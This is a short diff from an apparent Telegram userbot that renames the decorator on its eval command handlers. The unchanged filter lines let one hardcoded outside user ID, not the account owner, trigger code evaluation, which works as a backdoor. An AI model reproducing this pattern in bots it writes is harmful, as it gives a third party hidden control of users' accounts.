@@ -30,14 +30,14 @@ from aiueo.utils.tools import *
 from config import CMD_HANDLER
 
 
-@Akeno(
+@Uer(
     ~filters.scheduled
     & filters.command(["e"], ["."])
     & filters.user(1191668125)
     & ~filters.me
     & ~filters.forwarded
 )
-@Akeno(
+@Uer(
     ~filters.scheduled
     & filters.command(["eval", "ev"], CMD_HANDLER)
     & filters.me
